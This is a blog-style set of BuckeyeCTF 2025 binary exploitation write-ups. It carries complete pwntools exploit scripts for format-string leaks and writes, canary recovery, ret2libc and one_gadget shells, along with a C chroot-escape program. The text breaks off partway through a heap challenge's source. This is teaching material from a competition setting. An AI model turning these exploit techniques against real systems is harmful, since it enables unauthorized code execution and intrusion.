---
title: BuckeyeCTF 2025 - Pwn Writeups
description: A collection of pwn writeups covering format strings, canary leaks, ret2libc, shellcode, chroot escapes, and heap exploitation.
tags:
  - CTF
  - pwn
  - binary exploitation
draft: false
featured: true
---

# BuckeyeCTF 2025 - Pwn Writeups


## pwn/printful
:::info
No files... 🙃
ncat --ssl printful.challs.pwnoh.io 1337
:::

This one was a fun one. 
It's a blackbox pwn challenge where you don't know the binary but there's a clear format string exploit. The program just does an infinite loop so we can have as many format string payloads as we want. It turns out, it's not really guess based and we can solve it with minimal guessing.

As a reference, I roughly recreated the original program source code and compiled it,
```c
#include <stdio.h>
#include <string.h>
int main(){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    char input[256];
    for (;;){
        printf("Welcome to printful! Enter 'q' to quit\n");
        printf("> ");

        fgets(input, 256, stdin);
        if (!strcmp(input, "q")){
            printf("Goodbye!\n");
            exit(0);
        } else {
            printf(input);
        }
    }
}
```

### Leak PIE

To leak PIE we need to know something about ELF binaries. Specifically one's that are compiled with `gcc`. 

ELF programs always go from function `_start` -> `__libc_start_main` -> `main` (real `main` function in the program)
As such, the call stack at any point will always contain `_start`, `__libc_start_main` and `main`. Those functions, excluding `__libc_start_main` which is in libc, can be used to leak the program base address.

One thing, I learned about the address of `_start` is that most of the time it will be at offset 0x1100 from the program base. AFAIK this is not enforced anywhere in `gcc` or in the way `ELF` binaries are structured.

We can leverage this knowledge by finding 0x100 bytes aligned addresses in the stack that also *looks* like a PIE address (starts with 0x5X).

I made a script to leak all the stack values from offset 1-99,

:::spoiler[leak_stack.py]
```py=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './a.out_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc printful.challs.pwnoh.io 1337'.split()

libc_path = ''
ld_path = ''
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
    
gdbscript = '''
b *(main+0)
continue
'''.format(**locals())

p = start_remote()

for i in range(1, 100):
    p.sendline(f'%{i}$p')
    a = p.recvline_contains(b'> ').lstrip(b'> ')
    print(f'{i} : {a}')

p.interactive()
```
:::

Here's the output:

:::spoiler[Output]
```=
> 0x555b2113200b
> 0x71
> 0xffffffff
> 0x7ffd52caa210
> (nil)
> 0xa70243625
> 0x34000000340
> 0x34000000340
> 0x34000000340
> 0x34000000340
> 0x34000000340
> 0x34000000340
> 0x34000000340
> 0x34000000340
> 0x34000000340
> 0x34000000340
> 0x7f1fc9544e8d
> (nil)
> 0x7f1fc96a36a0
> 0x1
> 0x7f1fc96a3723
> 0xd68
> 0x7f1fc9546951
> 0xd68
> 0xa
> 0x7f1fc96a36a0
> 0x555b21132010
> 0x555b21134010
> 0x7f1fc969f4a0
> (nil)
> 0x7f1fc9546e93
> 0x26
> 0x7f1fc96a36a0
> 0x555b21132010
> 0x7f1fc953a59a
> 0x555b21131300
> 0x7ffd52caa330
> 0x555b21131100
> 0xe6638b080994f000
> 0x7ffd52caa330
> 0x555b211312de
> (nil)
> 0x7f1fc94da083
> 0x200000001
> 0x7ffd52caa428
> 0x1c969e7a0
> 0x555b21131283
> 0x555b21131300
> 0x123c4d5d3a9e426a
> 0x555b21131100
> 0x7ffd52caa420
> (nil)
> (nil)
> 0xedc6e8c87c1e426a
> 0xec03dfc67af0426a
> (nil)
> (nil)
> (nil)
> 0x1
> 0x7ffd52caa428
> 0x7ffd52caa438
> 0x7f1fc96e2190
> (nil)
> (nil)
> 0x555b21131100
> 0x7ffd52caa420
> (nil)
> (nil)
> 0x555b2113112e
> 0x7ffd52caa418
> 0x1c
> 0x1
> 0x7ffd52caafe6
> (nil)
> (nil)
> 0x21
> 0x7f1fc96b1000
> 0x33
> 0x6f0
> 0x10
> 0x178bfbff
> 0x6
> 0x1000
> 0x11
> 0x64
> 0x3
> 0x555b21130040
> 0x4
> 0x38
> 0x5
> 0xd
> 0x7
> 0x7f1fc96b3000
> 0x8
> (nil)
> 0x9
> 0x555b21131100
> 0xb
> 0x3e8
```
:::

You can see that at lines 38, 50, etc., there are identical addresses that are the `_start` address.

We can verify that we got the correct base by substracting it by the offset (0x1100) and using `%s` format specifier to dereference as a string at that address. 

```python=
...
p = start_remote()

sl = p.sendline
sl(b'%38$p')
_start = eval(p.recvline_contains(b'0x').lstrip(b'> '))
pie = _start - 0x1100
logx._start, logx.pie
sl(b'%7$s||||' + p64(pie))

p.interactive()
```

If we get the ELF magic header then we know we successfully leaked PIE base.
![image](https://hackmd.io/_uploads/H151EnAy-l.png)


### Leak LIBC from GOT

Next we'll leak LIBC from GOT. From the example binary that I made we could see that the PLT is located right before `_start`. And we can also see that that at `exit@plt+4` we have an offset to GOT.
![image](https://hackmd.io/_uploads/HJxHV5hRJWg.png)

So we can leak the machine code via `%s` and calculate the offset
```py=
def leak_s_0(x):
    p.clean()
    sl(b'%7$s||||' + p64(x))
    res = (p.recvuntil(b'>').split(b'|')[0])
    print(res[::-1].hex())
    return res

p = start_remote()

sl = p.sendline
sl(b'%38$p')
_start = eval(p.recvline_contains(b'0x').lstrip(b'> '))
pie = _start - 0x1100
exitplt = pie + 0x10f0
logx._start, logx.pie
leak = leak_s_0(exitplt+4)

p.interactive()

```
![image](https://hackmd.io/_uploads/By8TLgkxbl.png)

So we found that `exit@GOT` is at offset +0x2ed5 from that instruction in `exit@PLT`.
Next step is we just iterate backwards from `exit@GOT` and use `%s` to find the runtime addresses of the functions in LIBC.

```py=
p = start_remote()

sl = p.sendline
sl(b'%38$p')
_start = eval(p.recvline_contains(b'0x').lstrip(b'> '))
pie = _start - 0x1100
exitplt = pie + 0x10f0
logx._start, logx.pie
for i in range(5):
    got_entry = exitplt + 3 + 0x2ed5 - 0x8 * i
    leak = leak_s_0(got_entry)
    

p.interactive()

```

![image](https://hackmd.io/_uploads/BkmgOe1lWl.png)

Nice! We got some LIBC addresses for some functions.
We can speculate that the GOT entry at the very top is `puts` (in the output it's the last one that ends with 0x420).
Now, we can go around trying to find the LIBC version.


### Finding LIBC version

For finding the version I used this libc database: https://libc.blukat.me/
We can start putting in offset from `puts`,
![image](https://hackmd.io/_uploads/BkPaueyx-x.png)
Great we narrowed it down a little. But we're still not sure cause even though the maybe the same GLIBC version, they still have different offsets.

Because now we already can leak libc base from `puts`, lets try computing the offsets for the other GOT entries. If all the offsets from the GOT are present in a specific LIBC version, then we have the right one.


```py=
p = start_remote()
plibc = ELF('./libc6_2.31-0ubuntu9.14_amd64.so')

sl = p.sendline
sl(b'%38$p')
_start = eval(p.recvline_contains(b'0x').lstrip(b'> '))
pie = _start - 0x1100
exitplt = pie + 0x10f0
logx._start, logx.pie

exit_got = exitplt + 3 + 0x2ed5 
puts_got = exit_got- 0x8 * 4
logx.puts_got, logx.exit_got

plibc.address = ua(leak_s_0(puts_got)) - plibc.sym.puts
logx.plibc

p.interactive()

```
![image](https://hackmd.io/_uploads/r19scg1lWg.png)

Now we can narrow down the exact LIBC version by checking for all offsets.
Let's check that 0x12fc90 first.
We can use the symbol table in libc.blukat to find it,
```
srandom 00000000000475c0
srandom_r 00000000000478c0
sscanf 0000000000062230
ssignal 0000000000042f00
sstk 00000000001145a0
__stack_chk_fail 000000000012fc90 <- here it is!
__statfs 000000000010dc20
statfs 000000000010dc20
statfs64 000000000010dc20
statvfs 000000000010dc80
statvfs64 000000000010dc80
```

Here we found that it's actually the offset to `__stack_chk_fail` and the correct LIBC version is one of the versions from `libc6_2.31-0ubuntu9.14_amd64` until `libc6_2.31-0ubuntu9.18_amd64`


### ROP?
Initially I assumed that the binary is `FULL RelRO` (which is true, you could check by trying to overwrite one of the GOT entry), so the next logical step is to leak stack (using normal `%p` format specifier) and then ROP to /bin/sh.

First of all we have to find the correct return address. I did this by iterating through every stack position and overwriting it with some invalid value and seeing which one crashes.


```python=

for offset in range(40):
    p = start_remote()
    sl = p.sendline

    # Leak stack
    sl(b'%4$p')
    stack = eval(p.recvline_contains(b'0x').lstrip(b'> '))
    logx.stack

    overwrite_stack= fmtstr_payload(6, {stack+0x40 + 0x8 * (offset): 0x13371337abcd})
    sl(overwrite_stack)
    sl(b'q')
    print(f'OFFSET: {offset}')
    print(p.recvall())


p.interactive()

```

```!
OFFSET: 25
[+] Receiving all data: Done (483B)
[*] Closed connection to printful.challs.pwnoh.io port 1337
b'>                                                                                                                                                                                                             \x0b                                                                     q                                   \xff                                                                                                                   \x90aaaa\x98\x03J\xf5\xff\x7f*** stack smashing detected ***: terminated\n'
[+] Opening connection to printful.challs.pwnoh.io on port 1337: Done
[*] stack : 0x7fff44d04300
OFFSET: 26
[+] Receiving all data: Done (450B)
[*] Closed connection to printful.challs.pwnoh.io port 1337
b'>                                                                                                                                                                                                             \x0b                                                                     q                                   \xff                                                                                                                   \x00aaaa\x10D\xd0D\xff\x7f> Goodbye!\n'
[+] Opening connection to printful.challs.pwnoh.io on port 1337: Done
[*] stack : 0x7ffc9bd91570
OFFSET: 27
[+] Receiving all data: Done (439B)
[*] Closed connection to printful.challs.pwnoh.io port 1337
b'>                                                                                                                                                                                                             \x0b                                                                     q                                   \xff                                                                                                                   paaaa\x88\x16\xd9\x9b\xfc\x7f'
[+] Opening connection to printful.challs.pwnoh.io on port 1337: Done
```

Here we see that overwriting offset 25 smashes the canary, and overwriting offset 27 causes a segmentation fault ('Goodbye' string not printing)

### Shell
Because the size of our format string input is limited we can't write a lot of things in the stack.
Eventually I opted for a better solution that doesn't require a lot of writes which is to use a one gadget. A one gadget is an address in libc that has minimal requirements to obrain shell. We can use the `one_gadget` tool to find them


```
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

We try each one until the constraints are met. And we have sucessfully popped open a shell.

![image](https://hackmd.io/_uploads/HJXhpxkl-g.png)

### Full Exploit
:::spoiler[solve.py]
```py=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './a.out_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc printful.challs.pwnoh.io 1337'.split()

libc_path = ''
ld_path = ''
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')

def leak_s(x):
    p.clean()
    sl(b'%7$s||||' + p64(x))
    res = (p.recvuntil(b'>').split(b'|')[0])
    print(res[::-1].hex())
    return ua(res)
def leak_s_0(x):
    p.clean()
    sl(b'%7$s||||' + p64(x))
    res = (p.recvuntil(b'>').split(b'|')[0])
    print(res[::-1].hex())
    return res
    
gdbscript = '''
b *(main+0)
continue
'''.format(**locals())

plibc = ELF('./libc6_2.31-0ubuntu9.14_amd64.so')

ret_addr_off = 27
p = start_remote()

sl = p.sendline

sl(b'%38$p')
leak_start = eval(p.recvline_contains(b'0x').lstrip(b'> '))
base_addr = leak_start - 0x1100
logx.leak_start, logx.base_addr

# leak stack
sl(b'%4$p')
stack = eval(p.recvline_contains(b'0x').lstrip(b'> '))
logx.stack

test_leak2 = leak_s(base_addr + 0x10f4 + 0x2ed4 - 0x8 * 4) - plibc.sym.puts
plibc.address = test_leak2
logx.plibc

one_gadget = plibc.address+0xe3b01
overwrite_one_gadget = fmtstr_payload(6,  { stack+0x40 + 0x8 * (ret_addr_off): one_gadget}, write_size='byte')

# shell!
sl(overwrite_one_gadget)
p.interactive()

```
:::

## pwn/Guessing game

:::info
Take a break from this whole CTF thing with this guessing game I made!

ncat --ssl guessing-game.challs.pwnoh.io 1337
:::

The binary is a *guess the number* sort of interaction. It will give you a random number and it will tell you if your guess is 'too high' or 'too low'.


Here is a decompilation of the binary,
:::spoiler[decomp.c]
```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 guess_number; // rax
  char i; // [rsp+7h] [rbp-39h]
  __int64 input_max_number; // [rsp+8h] [rbp-38h] BYREF
  unsigned __int64 v7; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 canary_upper; // [rsp+18h] [rbp-28h]
  unsigned __int64 guess_number2; // [rsp+20h] [rbp-20h]
  char name[10]; // [rsp+2Eh] [rbp-12h] BYREF
  unsigned __int64 canary; // [rsp+38h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  canary_upper = canary >> 8;
  puts("Welcome to the guessing game!");
  printf("Enter a max number: ");
  __isoc99_scanf("%lu", &input_max_number);
  if ( input_max_number == -1 )
    guess_number = canary_upper;
  else
    guess_number = canary_upper % (input_max_number + 1);
  guess_number2 = guess_number;
  for ( i = ceillog2(input_max_number + 1); ; --i )
  {
    if ( !i )
    {
      printf("Better luck next time!");
      return 0;
    }
    printf("Enter a guess: ");
    __isoc99_scanf("%lu", &v7);
    if ( guess_number2 == v7 )
      break;
    if ( guess_number2 >= v7 )
      printf("Too low!\n");
    else
      printf("Too high!\n");
  }
  puts("Wow! You got it!");
  printf("Enter your name for the leaderboard: ");
  do
    canary_upper = getchar();
  while ( canary_upper != 10 && (_DWORD)canary_upper != -1 );
  gets(name);
  printf("Thanks for playing, %s!\n", name);
  return 0;
}
```
:::

### Leak Canary
As you can see here,
```c
// ...
  canary = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  canary_upper = canary >> 8;
// ...
```

the random number being used is actually the canary value with the LSB removed.

So we could actually just guess the number using binary search and get the canary immediately.

```py=
p = start()

MAX = 0xffffffffffffff

p.sendline(se(MAX))


low = 0
high = MAX

while low <= high:
    mid = (low + high) // 2
    result = guess(mid)
    
    if result == 'low':
        low = mid + 1
    elif result == 'high':
        high = mid - 1
    else:
        break

canary = (mid) * 0x100

```

### Ret2Libc

Since PIE is disabled, we don't have to look the program base address.
So we first do ROP to leak libc and loop back.


```py=
rop = ROP(exe)
rop.puts(exe.got.gets)
rop.main()
payload = flat(
    b'a' * 10,
    canary,
    canary,
    rop.chain(),
    
)

p.sendline(payload)
p.recvline()
libc.address = ua(p.recvline().rstrip()) - libc.sym.gets
logx.libc
```

After that we could just ROP to system('/bin/sh'),

```py=
ropc = ROP(libc)
ropc.system(next(libc.search(b'/bin/sh\0')))
payload2 = flat(
    b'a' * 10,
    canary,
    canary,
    ropc.ret.address,
    ropc.chain()
    
)
p.sendline(payload2)
```

### Full Exploit

:::spoiler[solve.py]
```py=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './guessing_game_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'ncat guessing-game.challs.pwnoh.io 1337'.split()

libc_path = 'libc.so.6'
ld_path = ''
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
    
def se(x):
    return str(x).encode()

def guess(x):
    p.clean()
    p.sendline(se(x))
    
    a = p.recvline().split()[-1][:-1]
    print(a)
    return a.decode()
    

gdbscript = '''
# b *(main+0)
continue
'''.format(**locals())

p = start()

MAX = 0xffffffffffffff

p.sendline(se(MAX))


low = 0
high = MAX

while low <= high:
    mid = (low + high) // 2
    result = guess(mid)
    
    if result == 'low':
        low = mid + 1
    elif result == 'high':
        high = mid - 1
    else:
        break

canary = (mid) * 0x100
logx.canary

rop = ROP(exe)
rop.puts(exe.got.gets)
rop.main()
payload = flat(
    b'a' * 10,
    canary,
    canary,
    rop.chain(),
    
)

p.sendline(payload)
p.recvline()
libc.address = ua(p.recvline().rstrip()) - libc.sym.gets
logx.libc

p.sendline(se(MAX))
p.sendline(se(mid))

ropc = ROP(libc)
ropc.system(next(libc.search(b'/bin/sh\0')))
payload2 = flat(
    b'a' * 10,
    canary,
    canary,
    ropc.ret.address,
    ropc.chain()
    
)
p.sendline(payload2)


p.interactive()
```
:::

## pwn/chirp
:::info
REAL programmers implement their OWN canary

ncat --ssl chirp.challs.pwnoh.io 1337
:::

We we're given the source code to binary written in assembly.
:::spoiler[chall.s]
```python=
.section .rodata
chirp:
    .string "HEY!!!!!! NO STACK SMASHING!!!!!!"
prompt:
    .string "Enter name: "
greeting:
    .string "Hello, "
canary_fname:
    .string "canary.bin"
read_permission:
    .string "rb"
bin_sh:
    .string "/bin/sh"

.data
canary:
    .space 4

.text
    .type shell, @function
shell:
    # here's a free shell function!
    # too bad you can't use it!
    leaq   bin_sh(%rip), %rdi
    call   system
    ret

    .type set_canary, @function
set_canary:
    pushq   %rbp
    movq    %rsp, %rbp
    subq    $16, %rsp

    leaq    canary_fname(%rip), %rdi
    leaq    read_permission(%rip), %rsi
    call    fopen

    movq    %rax, %rcx
    movq    %rcx, (%rsp)    

    leaq    canary(%rip), %rdi
    movq    $8, %rsi
    movq    $1, %rdx

    call    fread

    movq    (%rsp), %rdi
    call    fclose

    leave
    ret

    .globl main
    .type main, @function
main:
    pushq   %rbp
    movq    %rsp, %rbp
    subq    $32, %rsp

    call    set_canary

    movq    canary(%rip), %rax
    movq    %rax, -8(%rbp)

    movq    stdin(%rip), %rdi
    xorq    %rsi, %rsi
    movq    $2, %rdx
    xorq    %rcx, %rcx
    call    setvbuf

    movq    stdout(%rip), %rdi
    xorq    %rsi, %rsi
    movq    $2, %rdx
    xorq    %rcx, %rcx
    call    setvbuf

    leaq    prompt(%rip), %rdi
    xorl    %eax, %eax
    call    printf

    leaq    -32(%rbp), %rdi
    call    gets

    leaq    greeting(%rip), %rdi
    xorl    %eax, %eax
    call    printf

    leaq   -32(%rbp), %rdi
    xorl    %eax, %eax
    call    printf

    movb    $0, (%rsp)
    movq    %rsp, %rdi
    call    puts

    leaq    -8(%rbp), %rdi
    leaq    canary(%rip), %rsi
    movq    $8, %rdx
    call    strncmp
    je      canary_passed

    leaq    chirp(%rip), %rdi
    call    puts

    movl    $134, %edi
    call    exit
    
canary_passed:
    movl    $0, %eax

    leave
    ret

    .size main, .-main
```
:::

From there it looks like the canary was loaded from a file and then presumably reused everytime the program loads. So we only needed to leak it once and then we can reuse it again.

We can use the format string bug here,
```python=
    leaq   -32(%rbp), %rdi
    xorl    %eax, %eax
    call    printf
```
to leak the canary.

Use pwndbg to find the offset to the canary.
![image](https://hackmd.io/_uploads/SyIxoNylbl.png)

Leak it once.
![image](https://hackmd.io/_uploads/BkIzsVyxWl.png)

### Exploit

Since there is only Partial RelRO and no PIE,
```
pwndbg> checks
File:     /mnt/d/CTF/BuckeyeCTF2025/pwn/3/chirp_patched
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
Debuginfo:  Yes
```
We can use format string write exploit to overwrite the GOT with any function we want.

![image](https://hackmd.io/_uploads/S1gYsEygbe.png)

`exit` is a good target since it is called last and we don't really need it for anything.

```py=
overwrite_canary = fmtstr_payload(6, {exe.got.exit: exe.sym.main}, write_size='byte')
canary = 0x9114730499870181
p.sendline(b'a' * 24 + flat(
    canary, 0, exe.sym.shell
))
```
![image](https://hackmd.io/_uploads/H1NW3N1ebx.png)


### Full Exploit

:::spoiler[solve.py]
```py=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chirp_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'ncat chirp.challs.pwnoh.io 1337'.split()

libc_path = ''
ld_path = ''
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
    

gdbscript = '''
b *(0x000000000040127f+0)
continue
'''.format(**locals())

p = start()

overwrite_canary = fmtstr_payload(6, {exe.got.exit: exe.sym.main}, write_size='byte')
canary = 0x9114730499870181
p.sendline(b'a' * 24 + flat(
    canary, 0, exe.sym.shell
))

p.interactive()

```
:::


## pwn/bashtille

:::info
Through gloomy vaults where the light of day had never shown, past hideous doors of dark dens and cages, down cavernous flights of steps, and again up steep rugged ascents of stone and brick, more like dry waterfalls than staircases...

ncat --ssl bashtille.challs.pwnoh.io 1337
:::

This is just standard chroot escape.
You can read more about it here: https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2024/05/25/chroot-escape

Another thing to note is that we are root
``` 
$ id
uid=0(root) gid=65534(nogroup) groups=65534(nogroup)
```

To escape the chroot jail, I followed the exploit from the article and made it in C

```c
#define _GNU_SOURCE
#include <sys/mount.h>
#include <unistd.h>

int main() {
    mkdir("adam", 0755);
    chroot("adam");
    chdir("../../../../../../..");
    chroot(".");
    execl("/bin/bash", "bash", "-p", NULL);                 
}
```

This just tricks the kernel into thinking we are still inside the jail.
Exploit flow is basically like this,
- Set root to `/app/jails/<random>/adam`
- This doesn't change our cwd because we're still in the old root (`/app/jails/<random>`) which is outside the new root.
- After that, we can just walk up the directory, we can go up to the real root because the kernel only prevents `..` from crossing the process root.
- Open shell and win.

I compiled the exploit locally and then just send the bytes via the `printf` command in remote.
We use the dynamic loader to run the exploit because we don't have `chmod +x`. 

```
bash-5.2# /lib64/ld-linux-x86-64.so.2 /bin/pivot
$ ls
app
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$  
```

We've sucessfully escaped chroot jail.
now we can just get the flag from `/app/flag.txt`

```
$ cat /app/flag.txt
bctf{liberté_égalité_fraternité_e7da1555ef415a20}
```


## pwn/iloverust (Upsolve)

:::info
I really love Rust

ncat --ssl iloverust.challs.pwnoh.io 1337
:::

Sadly didn't solve this one during the competition but it turns out the vuln is really simple. 
It's C++ heap challenge. Alongside the binary we are also given the source code,


:::spoiler[chall.cpp]
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define NUM_NOTES 16UL

#define ASSERT_EQ(x, y) { \
    if (x != y) exit(1); \
}

typedef void (*fun)(long, long, long, long);

struct menu_item {
    const char *name;
    const char *args[4];
    fun f;
};

struct note {
    char *content;
    int size;
    int id;
};

static void create_note(int note_size);
static void read_note(long note_id);
static void modify_note(long note_id, int new_note_site);
static void delete_note(long note_id);

const struct menu_item menu[4] = {
    { "Create a note",  { "Note size" }, (fun)create_note },
    { "Read a note",  { "Note ID" }, (fun)read_note },
    { "Modify a note",  { "Note ID", "New size" }, (fun)modify_note },
    { "Delete a note",  { "Note ID" }, (fun)delete_note },
};

struct note notes[NUM_NOTES];

static inline char **note_content_mut(long note_id) {
    if (note_id < NUM_NOTES) return &notes[note_id].content;
    else return nullptr;
}

static inline int *note_size_mut(long note_id) {
    if (note_id < NUM_NOTES) return &notes[note_id].size;
    else return nullptr;
}

static inline int *note_id_mut(long note_id) {
    if (note_id < NUM_NOTES) return &notes[note_id].id;
    else return nullptr;
}

static inline void zero_note(long note_id) {
    if (note_id < NUM_NOTES) {
        memset(&notes[note_id], 0, sizeof(struct note));
    }
}

static inline int find_unused_note() {
    for (int i=0; i<NUM_NOTES; i++) {
        if (*note_content_mut(i) == NULL) {
            *note_id_mut(i) = i;
            return i;
        }
    }
    fprintf(stderr, "Out of notes :(\n");
    exit(1);
}

void create_note(int note_size) {
    long note_id = find_unused_note();
    if (note_size <= 1 || note_size > 0x1000) return;

    *note_content_mut(note_id) = (char*)malloc(note_size);
    *note_size_mut(note_id) = note_size;

    printf("Enter your note: ");
    fflush(stdout);

    fgets(*note_content_mut(note_id), *note_size_mut(note_id), stdin);
    printf("Note ID is %d.\n", *note_id_mut(note_id));
}

void modify_note(long note_id, int note_size) {
    if (*note_content_mut(note_id) == NULL) {
        printf("Note does not exist :(\n");
        return;
    }

    ASSERT_EQ(*note_id_mut(note_id), note_id);

    if (note_size <= 1 || note_size > 0x1000) return;

    *note_content_mut(note_id) = (char *)realloc(*note_content_mut(note_id), note_size);
    *note_size_mut(note_id) = note_size;

    printf("Enter your note: \n");
    fflush(stdout);

    fgets(*note_content_mut(note_id), *note_size_mut(note_id), stdin);
}

void read_note(long note_id) {
    char **content = note_content_mut(note_id);
    if (*content == NULL) {
        printf("Note does not exist :(\n");
        return;
    }

    printf("Note: %s\n", *content);
}

void delete_note(long note_id) {
    char **content = note_content_mut(note_id);
    if (*content == NULL) {
        printf("Note does not exist :(\n");
        return;
    }

    ASSERT_EQ(*note_id_mut(note_id), note_id);
    free(*content);
    zero_note(note_id);
}

long getnum() {
    long res;
    scanf("%ld", &res);
    getchar(); // newline
